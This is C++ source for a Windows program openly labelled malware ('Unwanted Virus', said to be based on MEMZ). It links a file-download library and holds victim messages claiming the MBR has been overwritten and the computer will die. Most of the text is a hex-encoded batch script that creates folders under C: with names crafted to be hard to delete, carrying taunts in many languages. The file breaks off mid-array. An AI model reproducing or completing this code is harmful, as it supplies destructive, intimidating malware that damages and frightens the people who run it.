/*-------------------------------------------+
|                                            |
|   Unwanted Virus Source Code               |
|                                            |
|   (C) BenjaminFretez 2021.                 |
|                                            |
+--------------------------------------------*/

/* This malware is based on the MEMZ malware */

/* include files */
#include <windows.h> // Required for WINAPI
#include <iostream> // Required for input-output
#include <fstream> // Required for files
#include <stdio.h>

/* required for downloading files*/
#pragma comment (lib, "urlmon.lib")

using namespace std;

DWORD wb;

/* files content */
const unsigned char msg[] = "Hello! You have ran the called Úñåáñþéd ßí®ú’ (Unwanted Virus)\r\n\r\nYour computer is now done for anyway,\r\nkilling Unwanted.exe process will not do anything, just it rewrited the MBR...\r\nYour eta is 2 minutes, THE TIME IS RUNNING! =)";
const size_t msg_len = sizeof(msg);

const unsigned char diem[] = "ÜÓÚ ÑÉÉÐ ÞÓ ÐÍÉÉÉÉ²¼2ð¤ú®¥½ö’«   ÜÓÚ ÑÉEÐ TÓ ÐÍÉ YOU NEED TO DIEÉÉÉ aáaááá €€¼€³¤²¤¤¬²¬\r\nïñ§tág®áµ@Endersshow@#RT#$tþ¤³þ³å³äs³®É F3¤€Þ³TÅ®¤ÅÞ€ÜÉÜWÞÜÉ€Ü¤\r\n WHY ARE YOU RUNNING? WHY ARE YOU RUNNING? ÁÄÉ³ÁÅÅÁÅAÁÄÉ®Ü¼Ú¼½Í¾»¬»«¥®²³ÞÄ³®";
const size_t die_len = sizeof(diem);

const unsigned char lastm[] = "ÜÓÚ\n YOU COMPUTER WILL DIE IN 10 SECONDS €¤ÜÞÅ³®²®¤³Þ\r\n³€ÞÜ¤Wé nééð á ñéwc ímputyer guys¼€ÚÉ6YE³\r\n®²¤Þ¤€Ü¼Ú€Time is over, you killed it!¤Þ¤€Þ¤\r\n³é³å²€Þ¤";
const size_t last_len = sizeof(lastm);

const unsigned char escapem[] = "Hey! The escape is behind you,\r\nLook behind you please, Is there!!";
const size_t escape_len = sizeof(escapem);


const unsigned char batm[] = { 0xEF, 0xBB, 0xBF, 0x40, 0x65, 0x63, 0x68, 0x6F, 0x20, 0x6F, 0x66, 0x66, 0x0D, 0x0A, 0x63, 0x64,
0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x6C, 0x6F, 0x6C, 0x2C, 0x20, 0x6E, 0x69, 0x65, 0x20, 0x6D,
0x6F, 0xC5, 0xBC, 0x65, 0x73, 0x7A, 0x20, 0x6D, 0x6E, 0x69, 0x65, 0x20, 0x75, 0x73, 0x75, 0x6E,
0xC4, 0x85, 0xC4, 0x87, 0x20, 0x20, 0x5C, 0x22, 0x20, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43,
0x3A, 0x20, 0x6C, 0x6F, 0x6C, 0x20, 0x6E, 0x6F, 0x6E, 0x20, 0x70, 0x75, 0x6F, 0x69, 0x20, 0x63,
0x61, 0x6E, 0x63, 0x65, 0x6C, 0x6C, 0x61, 0x72, 0x6D, 0x69, 0x20, 0x5C, 0x22, 0x20, 0x0D, 0x0A,
0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x6C, 0x6F, 0x6C, 0x2C, 0x20, 0x76, 0x69, 0x20, 0x6E,
0x65, 0x20, 0x70, 0x6F, 0x76, 0x61, 0x73, 0x20, 0x66, 0x6F, 0x72, 0x69, 0x67, 0x69, 0x20, 0x6D,
0x69, 0x6E, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x4C, 0x4F,
0x4C, 0x2C, 0x20, 0x79, 0x6F, 0x75, 0x20, 0x63, 0x61, 0x6E, 0x6E, 0x6F, 0x74, 0x20, 0x67, 0x65,
0x74, 0x20, 0x72, 0x69, 0x64, 0x20, 0x6F, 0x66, 0x20, 0x6D, 0x65, 0x20, 0x5C, 0x22, 0x0D, 0x0A,
0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x4A, 0x41, 0x4A, 0x61, 0x2C, 0x20, 0x6E, 0x6F, 0x20,
0x6D, 0x65, 0x20, 0x70, 0x75, 0x65, 0x64, 0x65, 0x73, 0x20, 0x72, 0x65, 0x6D, 0x6F, 0x76, 0x65,
0x72, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x6C, 0x6F, 0x6C,
0x20, 0x76, 0x6F, 0x63, 0xC3, 0xAA, 0x20, 0x6E, 0xC3, 0xA3, 0x6F, 0x20, 0x70, 0x6F, 0x64, 0x65,
0x20, 0x73, 0x65, 0x20, 0x6C, 0x69, 0x76, 0x72, 0x61, 0x72, 0x20, 0x64, 0x65, 0x20, 0x6D, 0x69,
0x6D, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x4D, 0x44, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x6C, 0x6F, 0x6C,
0x20, 0x76, 0x6F, 0x73, 0x20, 0x6E, 0x6F, 0x20, 0x74, 0x65, 0x20, 0x70, 0x6F, 0x64, 0x65, 0x73,
0x20, 0x6C, 0x69, 0x62, 0x72, 0x61, 0x72, 0x20, 0x64, 0x65, 0x20, 0x6D, 0x69, 0x20, 0x5C, 0x22,
0x20, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x63, 0x3A, 0x20, 0x6C, 0x6F, 0x6C, 0x2C, 0x20, 0xCE,
0xB4, 0xCE, 0xB5, 0xCE, 0xBD, 0x20, 0xCE, 0xBC, 0xCF, 0x80, 0xCE, 0xBF, 0xCF, 0x81, 0xCE, 0xB5,
0xCE, 0xAF, 0xCF, 0x82, 0x20, 0xCE, 0xBD, 0xCE, 0xB1, 0x20, 0xCE, 0xBC, 0xCE, 0xB5, 0x20, 0xCE,
0xB1, 0xCF, 0x80, 0xCE, 0xB1, 0xCE, 0xBB, 0xCE, 0xBB, 0xCE, 0xB1, 0xCE, 0xB3, 0xCE, 0xB5, 0xCE,
0xAF, 0xCF, 0x82, 0x20, 0x5C, 0x22, 0x20, 0x0D, 0x0A, 0x4D, 0x44, 0x20, 0x22, 0x43, 0x3A, 0x20,
0x64, 0x6F, 0x20, 0x79, 0x6F, 0x75, 0x20, 0x73, 0x65, 0x65, 0x20, 0x69, 0x74, 0x2C, 0x20, 0x6E,
0x6F, 0x20, 0x6D, 0x65, 0x20, 0x6E, 0x6F, 0x74, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20,
0x22, 0x43, 0x3A, 0x20, 0x6C, 0x6F, 0x6C, 0x2C, 0x20, 0x74, 0x75, 0x20, 0x6E, 0x65, 0x20, 0x70,
0x65, 0x75, 0x78, 0x20, 0x70, 0x61, 0x73, 0x20, 0x74, 0x65, 0x20, 0x64, 0xC3, 0xA9, 0x62, 0x61,
0x72, 0x72, 0x61, 0x73, 0x73, 0x65, 0x72, 0x20, 0x64, 0x65, 0x20, 0x6D, 0x6F, 0x69, 0x20, 0x5C,
0x22, 0x20, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x59, 0x4F, 0x55, 0x20, 0x43,
0x41, 0x4E, 0x4E, 0x4F, 0x54, 0x20, 0x52, 0x45, 0x4D, 0x4F, 0x56, 0x45, 0x20, 0x4D, 0x45, 0x20,
0x48, 0x41, 0x48, 0x41, 0x41, 0x48, 0x41, 0x48, 0x41, 0x48, 0x41, 0x48, 0x41, 0x20, 0x5C, 0x22,
0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0xC3, 0x9D, 0xC3, 0x93, 0xC3, 0x9B, 0x20,
0xC3, 0x87, 0xC3, 0x82, 0x4E, 0x4E, 0xC3, 0x93, 0x54, 0x20, 0x52, 0xC3, 0x89, 0x4D, 0xC3, 0x93,
0x56, 0xC3, 0x89, 0x20, 0x4D, 0xC3, 0x89, 0x20, 0x48, 0xC3, 0x82, 0x48, 0xC3, 0x82, 0xC3, 0x82,
0x48, 0xC3, 0x82, 0x48, 0xC3, 0x82, 0x48, 0xC3, 0x82, 0x48, 0xC3, 0x82, 0x20, 0x5C, 0x22, 0x0D,
0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x57, 0xC3, 0x89, 0x20, 0xC3, 0x82, 0x52, 0xC3,
0x89, 0x20, 0x54, 0x48, 0xC3, 0x89, 0x20, 0xC3, 0x9F, 0xC3, 0x89, 0xC2, 0xA7, 0x54, 0x20, 0xC3,
0x8C, 0xC2, 0xA7, 0x4E, 0x54, 0x20, 0xC3, 0x8C, 0x54, 0x20, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D,
0x64, 0x20, 0x22, 0x63, 0x3A, 0x20, 0x57, 0x54, 0x46, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x4D, 0x44,
0x20, 0x22, 0x43, 0x3A, 0x20, 0x6C, 0x6F, 0x6C, 0x20, 0x63, 0x61, 0x6E, 0x6E, 0x6F, 0x74, 0x20,
0x6D, 0x6F, 0x76, 0x65, 0x20, 0x6D, 0x65, 0x20, 0x74, 0x6F, 0x20, 0x72, 0x65, 0x63, 0x79, 0x63,
0x6C, 0x65, 0x20, 0x62, 0x69, 0x6E, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x63,
0x3A, 0x20, 0x6C, 0x6F, 0x6C, 0x2C, 0x20, 0x64, 0x75, 0x20, 0x6B, 0x61, 0x6E, 0x6E, 0x73, 0x74,
0x20, 0x6D, 0x69, 0x63, 0x68, 0x20, 0x6E, 0x69, 0x63, 0x68, 0x74, 0x20, 0x6C, 0x6F, 0x73, 0x77,
0x65, 0x72, 0x64, 0x65, 0x6E, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x63, 0x3A,
0x20, 0x69, 0x74, 0x20, 0x69, 0x73, 0x20, 0x6C, 0x69, 0x6B, 0x65, 0x20, 0x63, 0x6F, 0x6E, 0x20,
0x66, 0x6F, 0x6C, 0x64, 0x65, 0x72, 0x73, 0x20, 0x72, 0x69, 0x67, 0x68, 0x74, 0x20, 0x5C, 0x22,
0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x63, 0x3A, 0x20, 0xE5, 0xA4, 0xA7, 0xE5, 0xA3, 0xB0, 0xE7,
0xAC, 0x91, 0xEF, 0xBC, 0x8C, 0xE4, 0xBD, 0xA0, 0xE4, 0xB8, 0x8D, 0xE8, 0x83, 0xBD, 0xE6, 0x91,
0x86, 0xE8, 0x84, 0xB1, 0xE6, 0x88, 0x91, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x4D, 0x44, 0x20, 0x22,
0x43, 0x3A, 0x20, 0x4C, 0x6F, 0x6C, 0x2C, 0x20, 0x62, 0x65, 0x6E, 0x64, 0x65, 0x6E, 0x20, 0x6B,
0x75, 0x72, 0x74, 0x75, 0x6C, 0x61, 0x6D, 0x61, 0x7A, 0x73, 0xC4, 0xB1, 0x6E, 0x20, 0x5C, 0x22,
0x0D, 0x0A, 0x4D, 0x44, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x4C, 0x4F, 0x4C, 0x2C, 0x20, 0x6E, 0x6F,
0x20, 0x70, 0x75, 0x65, 0x64, 0x65, 0x73, 0x20, 0x72, 0x65, 0x6D, 0x6F, 0x76, 0x65, 0x72, 0x6D,
0x65, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x4C, 0x4F, 0x4C,
0x2C, 0x20, 0x6E, 0x6F, 0x20, 0x70, 0x75, 0x65, 0x64, 0x65, 0x73, 0x20, 0x71, 0x75, 0x69, 0x74,
0x61, 0x72, 0x6D, 0x65, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x63, 0x3A, 0x20,
0x4C, 0x6F, 0x6C, 0x2C, 0x20, 0x6A, 0x65, 0x20, 0x6B, 0x75, 0x6E, 0x74, 0x20, 0x6D, 0x65, 0x20,
0x6E, 0x69, 0x65, 0x74, 0x20, 0x56, 0x45, 0x52, 0x57, 0x49, 0x4A, 0x44, 0x45, 0x52, 0x45, 0x4E,
0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x6E, 0x75, 0x6E, 0x63,
0x61, 0x20, 0x6D, 0x65, 0x20, 0x70, 0x6F, 0x64, 0x72, 0x61, 0x73, 0x20, 0x71, 0x75, 0x69, 0x74,
0x61, 0x72, 0x20, 0x4A, 0x41, 0x4A, 0x41, 0x41, 0x4A, 0x41, 0x4A, 0x41, 0x4A, 0x41, 0x20, 0x5C,
0x22, 0x0D, 0x0A, 0x4D, 0x44, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x79, 0x6F, 0x75, 0x20, 0x63, 0x61,
0x6E, 0x20, 0x6E, 0x65, 0x76, 0x65, 0x72, 0x20, 0x64, 0x65, 0x6C, 0x65, 0x74, 0x65, 0x20, 0x6D,
0x65, 0x20, 0x48, 0x41, 0x48, 0x41, 0x48, 0x41, 0x48, 0x41, 0x48, 0x41, 0x48, 0x41, 0x20, 0x5C,
0x22, 0x0D, 0x0A, 0x4D, 0x44, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x4F, 0x48, 0x20, 0x53, 0x55, 0x52,
0x50, 0x52, 0x49, 0x53, 0x45, 0x44, 0x20, 0x51, 0x55, 0x45, 0x53, 0x54, 0x49, 0x4F, 0x4E, 0x20,
0x4D, 0x41, 0x52, 0x4B, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x63, 0x3A, 0x20,
0x6F, 0x68, 0x2C, 0x20, 0x74, 0x68, 0x65, 0x72, 0x65, 0x20, 0x69, 0x73, 0x20, 0x6E, 0x6F, 0x20,
0x65, 0x73, 0x63, 0x61, 0x70, 0x65, 0x20, 0x6F, 0x66, 0x20, 0x74, 0x68, 0x69, 0x73, 0x20, 0x68,
0x75, 0x68, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x63, 0x3A, 0x20, 0x6F, 0x68,
0x2C, 0x20, 0x6E, 0x6F, 0x20, 0x68, 0x61, 0x79, 0x20, 0x65, 0x73, 0x63, 0x61, 0x70, 0x65, 0x20,
0x70, 0x61, 0x72, 0x61, 0x20, 0x65, 0x73, 0x74, 0x6F, 0x20, 0x6A, 0x61, 0x20, 0x5C, 0x22, 0x0D,
0x0A, 0x6D, 0x64, 0x20, 0x22, 0x63, 0x3A, 0x20, 0x6F, 0x68, 0x2C, 0x20, 0x79, 0x6F, 0x75, 0x72,
0x20, 0x64, 0x65, 0x73, 0x6B, 0x74, 0x6F, 0x70, 0x20, 0x69, 0x73, 0x20, 0x66, 0x69, 0x6C, 0x6C,
0x65, 0x64, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x6E, 0x65,
0x76, 0x65, 0x72, 0x20, 0x65, 0x76, 0x65, 0x72, 0x20, 0x69, 0x6E, 0x20, 0x6C, 0x69, 0x66, 0x65,
0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x63, 0x3A, 0x20, 0x6E, 0x6F, 0x6F, 0x69,
0x74, 0x20, 0x69, 0x6E, 0x20, 0x68, 0x65, 0x74, 0x20, 0x6C, 0x65, 0x76, 0x65, 0x6E, 0x20, 0x5C,
0x22, 0x0D, 0x0A, 0x4D, 0x44, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x6E, 0x75, 0x6E, 0x63, 0x61, 0x20,
0x6A, 0x61, 0x6D, 0x61, 0x73, 0x20, 0x65, 0x6E, 0x20, 0x6C, 0x61, 0x20, 0x76, 0x69, 0x64, 0x61,
0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0xD0, 0xBD, 0xD0, 0xB8,
0xD0, 0xBA, 0xD0, 0xBE, 0xD0, 0xB3, 0xD0, 0xB4, 0xD0, 0xB0, 0x20, 0xD0, 0xB2, 0x20, 0xD0, 0xB6,
0xD0, 0xB8, 0xD0, 0xB7, 0xD0, 0xBD, 0xD0, 0xB8, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20,
0x22, 0x43, 0x3A, 0x20, 0xCF, 0x80, 0xCE, 0xBF, 0xCF, 0x84, 0xCE, 0xAD, 0x20, 0xCF, 0x83, 0xCF,
0x84, 0xCE, 0xB7, 0x20, 0xCE, 0xB6, 0xCF, 0x89, 0xCE, 0xAE, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D,
0x64, 0x20, 0x22, 0x63, 0x3A, 0x20, 0x6A, 0x61, 0x6A, 0x73, 0x6A, 0x64, 0x73, 0x6A, 0x64, 0x6A,
0x73, 0x6A, 0x73, 0x6A, 0x66, 0x73, 0x64, 0x6A, 0x66, 0x6A, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D,
0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x68, 0x61, 0x61, 0x68, 0x61, 0x68, 0x61, 0x68, 0x68, 0x61,
0x61, 0x68, 0x61, 0x68, 0x61, 0x68, 0x61, 0x68, 0x61, 0x68, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D,
0x64, 0x20, 0x22, 0x63, 0x3A, 0x20, 0x77, 0x68, 0x6F, 0x20, 0x61, 0x72, 0x65, 0x20, 0x79, 0x6F,
0x75, 0x2C, 0x20, 0x69, 0x20, 0x64, 0x6F, 0x6E, 0x74, 0x20, 0x6B, 0x6E, 0x6F, 0x77, 0x20, 0x72,
0x75, 0x6E, 0x20, 0x77, 0x68, 0x6F, 0x61, 0x6D, 0x69, 0x20, 0x70, 0x72, 0x6F, 0x67, 0x72, 0x61,
0x6D, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0xD0, 0xB0, 0xD0,
0xBC, 0xD1, 0x8C, 0xD0, 0xB4, 0xD1, 0x80, 0xD0, 0xB0, 0xD0, 0xBB, 0xD0, 0xB4, 0x20, 0xD1, 0x85,
0xD1, 0x8D, 0xD0, 0xB7, 0xD1, 0x8D, 0xD1, 0x8D, 0x20, 0xD1, 0x87, 0x20, 0xD1, 0x85, 0xD1, 0x8D,
0xD0, 0xB7, 0xD1, 0x8D, 0xD1, 0x8D, 0x20, 0xD1, 0x87, 0x20, 0x28, 0x69, 0x20, 0x6D, 0x65, 0x61,
0x6E, 0x29, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x63, 0x3A, 0x20, 0x48, 0x61,
0x79, 0x61, 0x74, 0x74, 0x61, 0x20, 0x61, 0x73, 0x6C, 0x61, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D,
0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0xE6, 0xB0, 0xB8, 0xE6, 0x97, 0xA0, 0xE4, 0xB8, 0x80, 0xE7,
0x94, 0x9F, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x6E, 0x6F,
0x6F, 0x69, 0x74, 0x20, 0x69, 0x6E, 0x20, 0x64, 0x69, 0x65, 0x20, 0x6C, 0x65, 0x77, 0x65, 0x20,
0x6E, 0x69, 0x65, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x4D, 0x44, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x6E,
0x69, 0x65, 0x6D, 0x61, 0x6C, 0x73, 0x20, 0x69, 0x6D, 0x20, 0x4C, 0x65, 0x62, 0x65, 0x6E, 0x20,
0x5C, 0x22, 0x0D, 0x0A, 0x4D, 0x44, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x49, 0x6E, 0x6F, 0x69, 0x7A,
0x20, 0x65, 0x7A, 0x20, 0x62, 0x69, 0x7A, 0x69, 0x74, 0x7A, 0x61, 0x6E, 0x20, 0x5C, 0x22, 0x0D,
0x0A, 0x4D, 0x44, 0x20, 0x22, 0x63, 0x3A, 0x20, 0x4E, 0x75, 0x6E, 0x71, 0x75, 0x61, 0x6D, 0x20,
0x49, 0x6E, 0x20, 0x76, 0x69, 0x74, 0x61, 0x65, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20,
0x22, 0x63, 0x3A, 0x20, 0x6E, 0x65, 0x76, 0x65, 0x72, 0x20, 0x69, 0x6E, 0x20, 0x79, 0x6F, 0x75,
0x72, 0x20, 0x6C, 0x69, 0x66, 0x65, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43,
0x3A, 0x20, 0x42, 0x4F, 0x52, 0x49, 0x4E, 0x47, 0x20, 0x54, 0x59, 0x50, 0x49, 0x4E, 0x47, 0x20,
0x54, 0x48, 0x49, 0x53, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20,
0xE1, 0x8B, 0xAD, 0xE1, 0x88, 0x85, 0xE1, 0x8A, 0x95, 0xE1, 0x8A, 0x95, 0x20, 0xE1, 0x88, 0x9B,
0xE1, 0x88, 0xB5, 0xE1, 0x8B, 0x88, 0xE1, 0x8C, 0x88, 0xE1, 0x8B, 0xB5, 0x20, 0xE1, 0x8A, 0xA0,
0xE1, 0x8B, 0xAD, 0xE1, 0x89, 0xBD, 0xE1, 0x88, 0x89, 0xE1, 0x88, 0x9D, 0x20, 0x5C, 0x22, 0x0D,
0x0A, 0x4D, 0x44, 0x20, 0x22, 0x63, 0x3A, 0x20, 0xD4, 0xB4, 0xD5, 0xB8, 0xD6, 0x82, 0xD6, 0x84,
0x20, 0xD5, 0xB9, 0xD5, 0xA5, 0xD6, 0x84, 0x20, 0xD5, 0xAF, 0xD5, 0xA1, 0xD6, 0x80, 0xD5, 0xB8,
0xD5, 0xB2, 0x20, 0xD5, 0xBD, 0xD5, 0xA1, 0x20, 0xD5, 0xB0, 0xD5, 0xA1, 0xD5, 0xB6, 0xD5, 0xA5,
0xD5, 0xAC, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x42, 0x75,
0x6E, 0x75, 0x20, 0x73, 0x69, 0x6C, 0xC9, 0x99, 0x20, 0x62, 0x69, 0x6C, 0x6D, 0xC9, 0x99, 0x7A,
0x73, 0x69, 0x6E, 0x69, 0x7A, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x4D, 0x44, 0x20, 0x22, 0x63, 0x3A,
0x20, 0xE0, 0xA6, 0x86, 0xE0, 0xA6, 0xAA, 0xE0, 0xA6, 0xA8, 0xE0, 0xA6, 0xBF, 0x20, 0xE0, 0xA6,
0x8F, 0xE0, 0xA6, 0x9F, 0xE0, 0xA6, 0xBF, 0xE0, 0xA6, 0x95, 0xE0, 0xA7, 0x87, 0x20, 0xE0, 0xA6,
0xB8, 0xE0, 0xA6, 0xB0, 0xE0, 0xA6, 0xBE, 0xE0, 0xA6, 0xA4, 0xE0, 0xA7, 0x87, 0x20, 0xE0, 0xA6,
